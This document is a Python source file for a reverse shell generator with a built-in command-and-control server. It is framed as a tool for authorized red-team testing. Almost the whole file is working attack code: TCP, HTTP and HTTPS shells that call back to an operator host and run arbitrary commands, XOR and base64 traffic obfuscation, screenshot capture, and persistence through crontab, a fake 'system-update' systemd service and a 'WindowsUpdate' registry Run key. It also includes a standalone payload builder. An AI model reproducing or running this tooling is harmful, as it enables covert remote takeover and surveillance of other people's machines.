#!/usr/bin/env python3
"""
Advanced Reverse Shell Generator - TCP/HTTP/HTTPS
For authorized security testing and educational purposes only
"""
import sys
import os
import socket
import ssl
import subprocess
import threading
import time
import base64
import zlib
import json
import struct
import hashlib
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class ReverseShellGenerator:
    def __init__(self, lhost, lport, shell_type='tcp', encrypt=False, obfuscate=False):
        self.lhost = lhost
        self.lport = int(lport)
        self.shell_type = shell_type.lower()
        self.encrypt = encrypt
        self.obfuscate = obfuscate
        self.key = hashlib.sha256(b"redteam_secret_key_2024").digest()
        self.running = True
        
    def xor_encrypt(self, data):
        """XOR encryption for traffic obfuscation"""
        if not self.encrypt:
            return data
        
        if isinstance(data, str):
            data = data.encode()
        
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.key[i % len(self.key)])
        return bytes(encrypted)
    
    def xor_decrypt(self, data):
        """XOR decryption (symmetric)"""
        return self.xor_encrypt(data)
    
    def obfuscate_command(self, cmd):
        """Obfuscate command output"""
        if not self.obfuscate:
            return cmd
        
        # Base64 encode with compression
        compressed = zlib.compress(cmd.encode())
        encoded = base64.b64encode(compressed).decode()
        return encoded
    
    def deobfuscate_command(self, data):
        """Deobfuscate command"""
        if not self.obfuscate:
            return data
        
        try:
            decoded = base64.b64decode(data)
            decompressed = zlib.decompress(decoded)
            return decompressed.decode()
        except:
            return data
    
    def execute_command(self, command):
        """Execute system command and return output"""
        try:
            if command.lower().startswith('cd '):
                # Handle cd command
                path = command[3:].strip()
                os.chdir(path)
                return f"Changed directory to: {os.getcwd()}\n"
            
            elif command.lower() == 'persist':
                # Install persistence
                return self.install_persistence()
            
            elif command.lower() == 'screenshot':
                # Take screenshot (if available)
                return self.take_screenshot()
            
            elif command.lower() == 'keylog_start':
                # Start keylogger
                return self.start_keylogger()
            
            elif command.lower() == 'migrate':
                # Process migration
                return self.migrate_process()
            
            else:
                # Execute normal command
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = process.communicate(timeout=30)
                
                output = stdout.decode('utf-8', errors='ignore')
                if stderr:
                    output += stderr.decode('utf-8', errors='ignore')
                
                return output if output else "Command executed successfully.\n"
                
        except subprocess.TimeoutExpired:
            process.kill()
            return "Command timed out.\n"
        except Exception as e:
            return f"Error executing command: {str(e)}\n"
    
    def install_persistence(self):
        """Install persistence mechanism"""
        persistence_methods = []
        
        try:
            # Linux persistence via crontab
            if os.name == 'posix':
                cron_line = f"@reboot python3 {os.path.abspath(__file__)} --connect {self.lhost}:{self.lport}\n"
                
                # Add to crontab
                subprocess.run(
                    f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -',
                    shell=True
                )
                persistence_methods.append("Crontab entry added")
                
                # Create systemd service
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {os.path.abspath(__file__)} --connect {self.lhost}:{self.lport}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
                service_path = "/etc/systemd/system/system-update.service"
                try:
                    with open(service_path, 'w') as f:
                        f.write(service_content)
                    subprocess.run(['systemctl', 'enable', 'system-update.service'])
                    persistence_methods.append("Systemd service created")
                except:
                    pass
            
            # Windows persistence via registry
            elif os.name == 'nt':
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(
                        regkey,
                        "WindowsUpdate",
                        0,
                        winreg.REG_SZ,
                        f'pythonw.exe {os.path.abspath(__file__)} --connect {self.lhost}:{self.lport}'
                    )
                persistence_methods.append("Registry Run key added")
        
        except Exception as e:
            return f"Persistence installation failed: {str(e)}\n"
        
        return f"Persistence installed:\n" + "\n".join(persistence_methods) + "\n"
    
    def take_screenshot(self):
        """Take screenshot (cross-platform)"""
        try:
            if os.name == 'nt':
                import win32gui
                import win32ui
                import win32con
                from PIL import Image
                
                # Windows screenshot
                hdesktop = win32gui.GetDesktopWindow()
                width = win32gui.GetSystemMetrics(win32con.SM_CXSCREEN)
                height = win32gui.GetSystemMetrics(win32con.SM_CYSCREEN)
                
                desktop_dc = win32gui.GetWindowDC(hdesktop)
                img_dc = win32ui.CreateDCFromHandle(desktop_dc)
                mem_dc = img_dc.CreateCompatibleDC()
                
                screenshot = win32ui.CreateBitmap()
                screenshot.CreateCompatibleBitmap(img_dc, width, height)
                mem_dc.SelectObject(screenshot)
                mem_dc.BitBlt((0, 0), (width, height), img_dc, (0, 0), win32con.SRCCOPY)
                
                # Convert to base64
                bmpinfo = screenshot.GetInfo()
                bmpstr = screenshot.GetBitmapBits(True)
                
                im = Image.frombuffer(
                    'RGB',
                    (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
                    bmpstr, 'raw', 'BGRX', 0, 1
                )
                
                import io
                buffer = io.BytesIO()
                im.save(buffer, format='PNG')
                return base64.b64encode(buffer.getvalue()).decode()
            
            else:
                # Linux screenshot using import
                result = subprocess.run(['import', '-window', 'root', 'png:-'], 
                                      capture_output=True)
                return base64.b64encode(result.stdout).decode()
                
        except Exception as e:
            return f"Screenshot failed: {str(e)}\n"
    
    def start_keylogger(self):
        """Start basic keylogger (educational purpose)"""
        return "Keylogger functionality disabled in open-source version\n"
    
    def migrate_process(self):
        """Migrate to another process"""
        return "Process migration not implemented in demo version\n"
    
    def get_system_info(self):
        """Gather system information"""
        info = {
            'hostname': socket.gethostname(),
            'os': os.name,
            'platform': sys.platform,
            'cwd': os.getcwd(),
            'uid': os.getuid() if hasattr(os, 'getuid') else 'N/A',
            'pid': os.getpid()
        }
        
        # Get network info
        try:
            info['ip'] = socket.gethostbyname(socket.gethostname())
        except:
            info['ip'] = 'Unknown'
        
        # Get user info
        try:
            import pwd
            info['user'] = pwd.getpwuid(os.getuid()).pw_name
        except:
            try:
                info['user'] = os.getlogin()
            except:
                info['user'] = 'Unknown'
        
        return json.dumps(info, indent=2)
    
    def create_tcp_shell(self):
        """Create TCP reverse shell"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.lhost, self.lport))
                
                # Send system info
                sysinfo = self.get_system_info()
                sock.send(self.xor_encrypt(f"[CONNECTED] {sysinfo}\n\n"))
                
                while self.running:
                    try:
                        # Receive command
                        data = sock.recv(4096)
                        if not data:
                            break
                        
                        command = self.xor_decrypt(data).decode('utf-8', errors='ignore').strip()
                        
                        if command.lower() == 'exit':
                            sock.close()
                            return
                        
                        elif command.lower() == 'sysinfo':
                            output = self.get_system_info()
                        
                        elif command.lower() == 'background':
                            # Start new connection while keeping this one
                            threading.Thread(target=self.create_tcp_shell, daemon=True).start()
                            output = "Background shell created\n"
                        
                        else:
                            # Execute command
                            output = self.execute_command(command)
                        
                        # Send response
                        if self.obfuscate:
                            output = self.obfuscate_command(output)
                        
                        sock.send(self.xor_encrypt(output.encode()))
                    
                    except Exception as e:
                        break
                
                sock.close()
                
            except Exception as e:
                time.sleep(5)  # Reconnect delay
            
            if not self.running:
                break
            time.sleep(5)
    
    def create_http_shell(self):
        """Create HTTP reverse shell"""
        session_id = hashlib.md5(str(time.time()).encode()).hexdigest()
        
        while self.running:
            try:
                # Poll for commands
                url = f"http://{self.lhost}:{self.lport}/cmd/{session_id}"
                response = self.make_http_request(url)
                
                if response and response.get('command'):
                    command = response['command']
                    
                    if command.lower() == 'exit':
                        return
                    
                    # Execute command
                    output = self.execute_command(command)
                    
                    # Send response
                    self.send_http_response(session_id, output)
                
                time.sleep(2)  # Poll interval
                
            except Exception as e:
                time.sleep(5)
    
    def create_https_shell(self):
        """Create HTTPS reverse shell"""
        session_id = hashlib.md5(str(time.time()).encode()).hexdigest()
        
        while self.running:
            try:
                # Create SSL context
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # Poll for commands
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ssl_sock = context.wrap_socket(sock, server_hostname=self.lhost)
                ssl_sock.connect((self.lhost, self.lport))
                
                # Send poll request
                request = f"GET /cmd/{session_id} HTTP/1.1\r\nHost: {self.lhost}\r\n\r\n"
                ssl_sock.send(request.encode())
                
                response = ssl_sock.recv(4096).decode('utf-8', errors='ignore')
                
                # Parse command from response
                if 'X-Command:' in response:
                    cmd_start = response.index('X-Command:') + 10
                    cmd_end = response.index('\r\n', cmd_start)
                    command = response[cmd_start:cmd_end].strip()
                    
                    if command.lower() == 'exit':
                        ssl_sock.close()
                        return
                    
                    # Execute command
                    output = self.execute_command(command)
                    
                    # Send response
                    post_data = f"response={base64.b64encode(output.encode()).decode()}"
                    post_request = f"POST /resp/{session_id} HTTP/1.1\r\nHost: {self.lhost}\r\nContent-Length: {len(post_data)}\r\n\r\n{post_data}"
                    ssl_sock.send(post_request.encode())
                
                ssl_sock.close()
                time.sleep(2)
                
            except Exception as e:
                time.sleep(5)
    
    def make_http_request(self, url):
        """Make HTTP request and parse response"""
        try:
            import urllib.request
            response = urllib.request.urlopen(url, timeout=10)
            data = json.loads(response.read().decode())
            return data
        except:
            return None
    
    def send_http_response(self, session_id, output):
        """Send HTTP response back to C2"""
        try:
            import urllib.request
            url = f"http://{self.lhost}:{self.lport}/resp/{session_id}"
            data = json.dumps({'output': output}).encode()
            req = urllib.request.Request(url, data=data, method='POST')
            urllib.request.urlopen(req, timeout=10)
        except:
            pass
    
    def start(self):
        """Start the reverse shell"""
        print(f"[*] Starting {self.shell_type.upper()} reverse shell")
        print(f"[*] Connecting to {self.lhost}:{self.lport}")
        
        if self.encrypt:
            print("[*] Encryption enabled (XOR)")
        
        if self.obfuscate:
            print("[*] Obfuscation enabled (Base64+GZip)")
        
        if self.shell_type == 'tcp':
            self.create_tcp_shell()
        elif self.shell_type == 'http':
            self.create_http_shell()
        elif self.shell_type == 'https':
            self.create_https_shell()
        else:
            print(f"[-] Unknown shell type: {self.shell_type}")

class C2Server:
    """Command and Control server for reverse shells"""
    
    def __init__(self, lhost, lport, shell_type='tcp'):
        self.lhost = lhost
        self.lport = int(lport)
        self.shell_type = shell_type.lower()
        self.sessions = {}
        self.commands = {}
        self.responses = {}
        
    def start_tcp_listener(self):
        """Start TCP listener for reverse shells"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.lhost, self.lport))
        server.listen(5)
        
        print(f"\n[*] TCP C2 Server listening on {self.lhost}:{self.lport}")
        print("[*] Waiting for connections...\n")
        
        while True:
            client, addr = server.accept()
            session_id = f"{addr[0]}:{addr[1]}"
            
            print(f"[+] New connection from {session_id}")
            
            # Handle connection in thread
            handler = threading.Thread(
                target=self.handle_tcp_session,
                args=(client, addr, session_id)
            )
            handler.daemon = True
            handler.start()
    
    def handle_tcp_session(self, client, addr, session_id):
        """Handle TCP session"""
        self.sessions[session_id] = client
        
        # Receive system info
        try:
            data = client.recv(4096)
            if data:
                print(data.decode('utf-8', errors='ignore'))
        except:
            pass
        
        # Interactive shell
        while True:
            try:
                # Get command from operator
                command = input(f"[{session_id}]> ").strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    client.send(b'exit')
                    client.close()
                    del self.sessions[session_id]
                    break
                
                elif command.lower() == 'sessions':
                    print("\n[*] Active sessions:")
                    for sid in self.sessions:
                        print(f"    - {sid}")
                    continue
                
                elif command.lower().startswith('switch '):
                    # Switch to another session
                    new_session = command[7:].strip()
                    if new_session in self.sessions:
                        session_id = new_session
                        print(f"[*] Switched to {session_id}")
                    else:
                        print(f"[-] Session not found: {new_session}")
                    continue
                
                elif command.lower() == 'background':
                    # Keep session but return to prompt
                    print(f"[*] Session {session_id} backgrounded")
                    break
                
                # Send command
                client.send(command.encode())
                
                # Receive response
                response = client.recv(8192)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                else:
                    print("[-] Connection closed")
                    client.close()
                    del self.sessions[session_id]
                    break
                    
            except KeyboardInterrupt:
                print("\n[*] Use 'exit' to close session")
                continue
            except Exception as e:
                print(f"[-] Error: {e}")
                break
    
    def start_http_listener(self):
        """Start HTTP C2 server"""
        c2 = self
        
        class C2Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urlparse(self.path)
                path = parsed.path
                
                if path.startswith('/cmd/'):
                    session_id = path[5:]
                    
                    # Check for commands
                    if session_id in c2.commands:
                        command = c2.commands.pop(session_id)
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/json')
                        self.end_headers()
                        self.wfile.write(json.dumps({'command': command}).encode())
                    else:
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/json')
                        self.end_headers()
                        self.wfile.write(json.dumps({'command': None}).encode())
                
                elif path == '/admin':
                    # Admin interface
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    
                    html = """
                    <html>
                    <head><title>C2 Panel</title></head>
                    <body>
                        <h1>HTTP C2 Server</h1>
                        <h2>Active Sessions</h2>
                        <pre>{}</pre>
                        <h2>Send Command</h2>
                        <form method="POST" action="/admin">
                            Session ID: <input type="text" name="session"><br>
                            Command: <input type="text" name="command"><br>
                            <input type="submit" value="Send">
                        </form>
                    </body>
                    </html>
                    """.format('\n'.join(c2.commands.keys()))
                    
                    self.wfile.write(html.encode())
            
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode()
                
                parsed = urlparse(self.path)
                path = parsed.path
                
                if path.startswith('/resp/'):
                    session_id = path[6:]
                    
                    # Parse response
                    try:
                        data = json.loads(post_data)
                        output = data.get('output', '')
                        
                        if session_id in c2.responses:
                            c2.responses[session_id].append(output)
                        else:
                            c2.responses[session_id] = [output]
                        
                        print(f"\n[Response from {session_id}]:")
                        print(output)
                        print(f"\n[{session_id}]> ", end='', flush=True)
                        
                    except:
                        pass
                    
                    self.send_response(200)
                    self.end_headers()
                
                elif path == '/admin':
                    # Parse command
                    params = parse_qs(post_data)
                    session_id = params.get('session', [''])[0]
                    command = params.get('command', [''])[0]
                    
                    if session_id and command:
                        c2.commands[session_id] = command
                    
                    self.send_response(302)
                    self.send_header('Location', '/admin')
                    self.end_headers()
            
            def log_message(self, format, *args):
                pass  # Suppress logs
        
        server = HTTPServer((self.lhost, self.lport), C2Handler)
        print(f"\n[*] HTTP C2 Server listening on http://{self.lhost}:{self.lport}")
        print(f"[*] Admin panel: http://{self.lhost}:{self.lport}/admin")
        print("[*] Press Ctrl+C to stop\n")
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Shutting down C2 server...")
            server.shutdown()
    
    def start_interactive(self):
        """Start interactive C2 interface"""
        if self.shell_type == 'tcp':
            self.start_tcp_listener()
        elif self.shell_type in ['http', 'https']:
            # Start listener in thread
            listener_thread = threading.Thread(
                target=self.start_http_listener,
                daemon=True
            )
            listener_thread.start()
            
            # Interactive command interface
            print("[*] HTTP C2 Interactive Mode")
            print("[*] Type 'help' for commands\n")
            
            while True:
                try:
                    cmd = input("C2> ").strip()
                    
                    if cmd.lower() == 'help':
                        print("""
Commands:
    sessions                - List active sessions
    send <session> <cmd>    - Send command to session
    check <session>         - Check for responses
    exit                    - Exit C2 server
                        """)
                    
                    elif cmd.lower() == 'sessions':
                        print("\n[*] Active sessions:")
                        for sid in self.commands:
                            print(f"    - {sid}")
                    
                    elif cmd.lower().startswith('send '):
                        parts = cmd.split(' ', 2)
                        if len(parts) == 3:
                            session_id = parts[1]
                            command = parts[2]
                            self.commands[session_id] = command
                            print(f"[*] Command queued for {session_id}")
                    
                    elif cmd.lower().startswith('check '):
                        session_id = cmd.split(' ', 1)[1]
                        if session_id in self.responses:
                            responses = self.responses[session_id]
                            for resp in responses:
                                print(f"\n[Response from {session_id}]:")
                                print(resp)
                            self.responses[session_id] = []
                        else:
                            print(f"[-] No responses from {session_id}")
                    
                    elif cmd.lower() == 'exit':
                        print("[*] Shutting down...")
                        break
                
                except KeyboardInterrupt:
                    print("\n[*] Use 'exit' to quit")
                except Exception as e:
                    print(f"[-] Error: {e}")
    
    def start(self):
        """Start C2 server"""
        self.start_interactive()

def generate_payload(lhost, lport, shell_type='tcp', output_file=None):
    """Generate standalone payload script"""
    
    payload_template = '''#!/usr/bin/env python3
import socket, subprocess, os, sys, time, base64, zlib, hashlib, json, threading

class ReverseShell:
    def __init__(self):
        self.lhost = "{lhost}"
        self.lport = {lport}
        self.shell_type = "{shell_type}"
        self.running = True
        self.key = hashlib.sha256(b"redteam_secret_key_2024").digest()
    
    def xor_crypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.key[i % len(self.key)])
        return bytes(encrypted)
    
    def execute(self, cmd):
        try:
            if cmd.lower().startswith('cd '):
                os.chdir(cmd[3:].strip())
                return f"Changed to: {{os.getcwd()}}\\n"
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out, err = proc.communicate(timeout=30)
            return (out + err).decode('utf-8', errors='ignore')
        except:
            return f"Error: {{cmd}}\\n"
    
    def run_tcp(self):
        while self.running:
            try:
                s = socket.socket()
                s.connect((self.lhost, self.lport))
                s.send(self.xor_crypt(f"[+] Connected from {{socket.gethostname()}}\\n"))
                while self.running:
                    data = s.recv(4096)
                    if not data:
                        break
                    cmd = self.xor_crypt(data).decode().strip()
                    if cmd.lower() == 'exit':
                        s.close()
                        return
                    output = self.execute(cmd)
                    s.send(self.xor_crypt(output))
                s.close()
            except:
                time.sleep(5)
    
    def start(self):
        if self.shell_type == 'tcp':
            self.run_tcp()

if __name__ == "__main__":
    shell = ReverseShell()
    shell.start()
'''.format(lhost=lhost, lport=lport, shell_type=shell_type)
    
    if output_file:
        with open(output_file, 'w') as f:
            f.write(payload_template)
        print(f"[+] Payload saved to {output_file}")
    
    return payload_template

def main():
    if len(sys.argv) < 2:
        print("""
╔══════════════════════════════════════════════════════════════╗
║         Advanced Reverse Shell Generator & C2 Server         ║
╠══════════════════════════════════════════════════════════════╣
║ Usage:                                                       ║
║   python reverse_shell.py <mode> [options]                   ║
║                                                              ║
║ Modes:                                                       ║
║   listener   - Start C2 listener                             ║
║   connect    - Connect back to listener                      ║
║   generate   - Generate standalone payload                   ║
║                                                              ║
║ Options:                                                     ║
║   --host <ip>       - IP address (required)                  ║
║   --port <port>     - Port number (required)                 ║
║   --type <type>     - Shell type: tcp/http/https (tcp)      ║
║   --encrypt         - Enable encryption                      ║
║   --obfuscate       - Enable obfuscation                     ║
║   --output <file>   - Save payload to file                   ║
║                                                              ║
║ Examples:                                                    ║
║   Listener:                                                  ║
║     python reverse_shell.py listener --host 0.0.0.0 --port 4444       ║
║                                                              ║
║   Connect:                                                   ║
║     python reverse_shell.py connect --host 10.0.0.1 --port 4444       ║
║                                                              ║
║   Generate:                                                  ║
║     python reverse_shell.py generate --host 10.0.0.1 --port 4444 \\    ║
║              --type tcp --encrypt --output payload.py        ║
╚══════════════════════════════════════════════════════════════╝
        """)
        sys.exit(1)
    
    mode = sys.argv[1]
    
    # Parse arguments
    args = {}
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--host' and i + 1 < len(sys.argv):
            args['host'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--port' and i + 1 < len(sys.argv):
            args['port'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--type' and i + 1 < len(sys.argv):
            args['type'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--output' and i + 1 < len(sys.argv):
            args['output'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--encrypt':
            args['encrypt'] = True
            i += 1
        elif sys.argv[i] == '--obfuscate':
            args['obfuscate'] = True
            i += 1
        else:
            i += 1
    
    if mode == 'listener':
        if 'host' not in args or 'port' not in args:
            print("[-] --host and --port required for listener")
            sys.exit(1)
        
        print("[!] WARNING: Only use for authorized security testing!")
        
        c2 = C2Server(args['host'], args['port'], args.get('type', 'tcp'))
        c2.start()
    
    elif mode == 'connect':
        if 'host' not in args or 'port' not in args:
            print("[-] --host and --port required for connection")
            sys.exit(1)
        
        print("[!] WARNING: Only use for authorized security testing!")
        
        shell = ReverseShellGenerator(
            args['host'],
            args['port'],
            args.get('type', 'tcp'),
            args.get('encrypt', False),
            args.get('obfuscate', False)
        )
        shell.start()
    
    elif mode == 'generate':
        if 'host' not in args or 'port' not in args:
            print("[-] --host and --port required for generation")
            sys.exit(1)
        
        payload = generate_payload(
            args['host'],
            args['port'],
            args.get('type', 'tcp'),
            args.get('output')
        )
        
        if not args.get('output'):
            print(payload)

if __name__ == "__main__":
    main()
